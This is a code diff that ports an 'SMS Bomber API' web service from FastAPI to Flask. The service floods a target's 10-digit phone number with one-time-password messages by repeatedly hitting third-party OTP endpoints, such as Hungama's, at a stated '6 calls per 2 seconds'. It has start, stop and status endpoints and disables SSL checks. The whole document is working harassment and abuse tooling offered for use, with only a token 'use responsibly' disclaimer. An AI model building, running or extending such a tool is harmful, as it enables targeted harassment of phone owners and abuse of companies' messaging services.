@@ -4,31 +4,18 @@ import aiohttp
 import sys
 import urllib.parse
 import time
-from fastapi import FastAPI, HTTPException
-from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import JSONResponse
 import random
-import os
+import uuid
+from flask import Flask, request, jsonify
+from aiohttp import ClientTimeout
 
-app = FastAPI(
-    title="SMS Bomber API",
-    description="High-speed SMS bombing API with 2x speed",
-    version="2.0"
-)
-
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
+app = Flask(__name__)
 
 # Global state management
 bomber_tasks = {}
 bomber_states = {}
 
-# Enhanced API endpoints with more targets
+# Enhanced API endpoints
 APIS = [
     {
         "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
@@ -307,7 +294,7 @@ async def send_request(session, api, phone_number, ip_address):
                     api["endpoint"], 
                     data=payload_str, 
                     headers=modified_headers, 
-                    timeout=aiohttp.ClientTimeout(total=1),
+                    timeout=ClientTimeout(total=1),
                     ssl=False
                 )
             else:
@@ -315,7 +302,7 @@ async def send_request(session, api, phone_number, ip_address):
                     api["endpoint"], 
                     json=modified_payload, 
                     headers=modified_headers, 
-                    timeout=aiohttp.ClientTimeout(total=1),
+                    timeout=ClientTimeout(total=1),
                     ssl=False
                 )
         else:
@@ -324,13 +311,12 @@ async def send_request(session, api, phone_number, ip_address):
         status_code = response.status
         return status_code, api
 
-    except (aiohttp.ClientError, asyncio.TimeoutError):
+    except Exception:
         return None, api
 
 async def bomber_worker(phone_number, ip_address, task_id):
     """Main bomber worker coroutine"""
-    session_timeout = aiohttp.ClientTimeout(total=10)
-    async with aiohttp.ClientSession(timeout=session_timeout) as session:
+    async with aiohttp.ClientSession() as session:
         cycle_count = 0
         successful_apis = APIS.copy()
         
@@ -372,30 +358,29 @@ async def bomber_worker(phone_number, ip_address, task_id):
             except Exception:
                 await asyncio.sleep(1)
 
-@app.get("/api/start")
-async def start_bomber(phone: str):
+def run_bomber(phone_number, ip_address, task_id):
+    """Run bomber in a separate thread"""
+    asyncio.run(bomber_worker(phone_number, ip_address, task_id))
+
+@app.route('/api/start', methods=['GET'])
+def start_bomber():
     """Start SMS bombing for a phone number"""
+    phone = request.args.get('phone', '')
+    
     if not phone.isdigit() or len(phone) != 10:
-        return JSONResponse(
-            status_code=400,
-            content={"error": "Invalid phone number! Must be 10 digits."}
-        )
+        return jsonify({"error": "Invalid phone number! Must be 10 digits."}), 400
     
     # Generate task ID
-    import uuid
     task_id = str(uuid.uuid4())
     
     # Check if already running
     if phone in bomber_states and bomber_states[phone].get("running", False):
-        return JSONResponse(
-            status_code=200,
-            content={
-                "status": "already_running",
-                "message": f"Bomber already running for {phone}",
-                "phone": phone,
-                "task_id": bomber_states[phone]["task_id"]
-            }
-        )
+        return jsonify({
+            "status": "already_running",
+            "message": f"Bomber already running for {phone}",
+            "phone": phone,
+            "task_id": bomber_states[phone]["task_id"]
+        })
     
     # Create new bomber state
     bomber_states[phone] = {
@@ -405,107 +390,79 @@ async def start_bomber(phone: str):
         "phone": phone
     }
     
-    # Start bomber task
-    bomber_tasks[task_id] = asyncio.create_task(bomber_worker(phone, "192.168.1.1", task_id))
+    # Start bomber task in separate thread
+    import threading
+    bomber_thread = threading.Thread(target=run_bomber, args=(phone, "192.168.1.1", task_id))
+    bomber_thread.daemon = True
+    bomber_thread.start()
     
-    return JSONResponse(
-        status_code=200,
-        content={
-            "status": "started",
-            "message": f"SMS bombing started for {phone}",
-            "phone": phone,
-            "task_id": task_id,
-            "speed": "6 calls per 2 seconds (2x speed)",
-            "api_count": len(APIS)
-        }
-    )
+    return jsonify({
+        "status": "started",
+        "message": f"SMS bombing started for {phone}",
+        "phone": phone,
+        "task_id": task_id,
+        "speed": "6 calls per 2 seconds (2x speed)",
+        "api_count": len(APIS)
+    })
 
-@app.get("/api/stop")
-async def stop_bomber(phone: str):
+@app.route('/api/stop', methods=['GET'])
+def stop_bomber():
     """Stop SMS bombing for a phone number"""
+    phone = request.args.get('phone', '')
+    
     if not phone.isdigit() or len(phone) != 10:
-        return JSONResponse(
-            status_code=400,
-            content={"error": "Invalid phone number! Must be 10 digits."}
-        )
+        return jsonify({"error": "Invalid phone number! Must be 10 digits."}), 400
     
     if phone not in bomber_states:
-        return JSONResponse(
-            status_code=200,
-            content={
-                "status": "not_running",
-                "message": f"No bomber running for {phone}",
-                "phone": phone
-            }
-        )
+        return jsonify({
+            "status": "not_running",
+            "message": f"No bomber running for {phone}",
+            "phone": phone
+        })
     
     if not bomber_states[phone].get("running", False):
-        return JSONResponse(
-            status_code=200,
-            content={
-                "status": "already_stopped",
-                "message": f"Bomber already stopped for {phone}",
-                "phone": phone
-            }
-        )
-    
-    # Cancel the task
-    task_id = bomber_states[phone]["task_id"]
-    if task_id in bomber_tasks:
-        bomber_tasks[task_id].cancel()
-        try:
-            await bomber_tasks[task_id]
-        except asyncio.CancelledError:
-            pass
-        del bomber_tasks[task_id]
+        return jsonify({
+            "status": "already_stopped",
+            "message": f"Bomber already stopped for {phone}",
+            "phone": phone
+        })
     
     # Update state
     bomber_states[phone]["running"] = False
     bomber_states[phone]["end_time"] = time.time()
     
-    return JSONResponse(
-        status_code=200,
-        content={
-            "status": "stopped",
-            "message": f"SMS bombing stopped for {phone}",
-            "phone": phone,
-            "task_id": task_id,
-            "duration": f"{bomber_states[phone].get('end_time', 0) - bomber_states[phone]['start_time']:.2f} seconds"
-        }
-    )
+    return jsonify({
+        "status": "stopped",
+        "message": f"SMS bombing stopped for {phone}",
+        "phone": phone,
+        "duration": f"{bomber_states[phone].get('end_time', 0) - bomber_states[phone]['start_time']:.2f} seconds"
+    })
 
-@app.get("/api/status")
-async def get_status(phone: str = None):
+@app.route('/api/status', methods=['GET'])
+def get_status():
     """Get status of all running bombers or specific phone number"""
+    phone = request.args.get('phone', '')
+    
     if phone:
         if not phone.isdigit() or len(phone) != 10:
-            return JSONResponse(
-                status_code=400,
-                content={"error": "Invalid phone number! Must be 10 digits."}
-            )
+            return jsonify({"error": "Invalid phone number! Must be 10 digits."}), 400
         
         if phone not in bomber_states:
-            return JSONResponse(
-                status_code=200,
-                content={
-                    "phone": phone,
-                    "status": "not_found",
-                    "running": False
-                }
-            )
+            return jsonify({
+                "phone": phone,
+                "status": "not_found",
+                "running": False
+            })
         
         state = bomber_states[phone]
-        return JSONResponse(
-            status_code=200,
-            content={
-                "phone": phone,
-                "status": "running" if state.get("running", False) else "stopped",
-                "running": state.get("running", False),
-                "task_id": state.get("task_id"),
-                "start_time": state.get("start_time"),
-                "duration": f"{time.time() - state['start_time']:.2f} seconds" if state.get("running") else None
-            }
-        )
+        return jsonify({
+            "phone": phone,
+            "status": "running" if state.get("running", False) else "stopped",
+            "running": state.get("running", False),
+            "task_id": state.get("task_id"),
+            "start_time": state.get("start_time"),
+            "duration": f"{time.time() - state['start_time']:.2f} seconds" if state.get("running") else None
+        })
     
     # Return all statuses
     all_statuses = []
@@ -521,50 +478,37 @@ async def get_status(phone: str = None):
             "duration": f"{current_time - state['start_time']:.2f} seconds" if state.get("running") else None
         })
     
-    return JSONResponse(
-        status_code=200,
-        content={
-            "total_bombers": len([s for s in all_statuses if s["running"]]),
-            "active_bombers": [s for s in all_statuses if s["running"]],
-            "all_bombers": all_statuses
-        }
-    )
+    return jsonify({
+        "total_bombers": len([s for s in all_statuses if s["running"]]),
+        "active_bombers": [s for s in all_statuses if s["running"]],
+        "all_bombers": all_statuses
+    })
 
-@app.get("/api/stats")
-async def get_stats():
+@app.route('/api/stats', methods=['GET'])
+def get_stats():
     """Get API statistics"""
-    return JSONResponse(
-        status_code=200,
-        content={
-            "total_apis": len(APIS),
-            "active_bombers": len([s for s in bomber_states.values() if s.get("running", False)]),
-            "total_sessions": len(bomber_states),
-            "api_endpoints": [api["endpoint"] for api in APIS]
-        }
-    )
+    return jsonify({
+        "total_apis": len(APIS),
+        "active_bombers": len([s for s in bomber_states.values() if s.get("running", False)]),
+        "total_sessions": len(bomber_states),
+        "api_endpoints": [api["endpoint"] for api in APIS]
+    })
 
-@app.get("/")
-async def root():
+@app.route('/', methods=['GET'])
+def root():
     """API root endpoint"""
-    return JSONResponse(
-        status_code=200,
-        content={
-            "message": "SMS Bomber API v2.0",
-            "version": "2.0",
-            "endpoints": {
-                "start": "/api/start?phone=NUMBER",
-                "stop": "/api/stop?phone=NUMBER", 
-                "status": "/api/status?phone=NUMBER",
-                "stats": "/api/stats"
-            },
-            "speed": "6 calls per 2 seconds (2x speed)",
-            "note": "Use responsibly. Developer not responsible for misuse."
-        }
-    )
+    return jsonify({
+        "message": "SMS Bomber API v2.0",
+        "version": "2.0",
+        "endpoints": {
+            "start": "/api/start?phone=NUMBER",
+            "stop": "/api/stop?phone=NUMBER", 
+            "status": "/api/status?phone=NUMBER",
+            "stats": "/api/stats"
+        },
+        "speed": "6 calls per 2 seconds (2x speed)",
+        "note": "Use responsibly. Developer not responsible for misuse."
+    })
 
-# Vercel handler
-def handler(request):
-    """Vercel serverless function handler"""
-    from mangum import Mangum
-    mangum_handler = Mangum(app)
-    return mangum_handler(request)
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8000, debug=True)
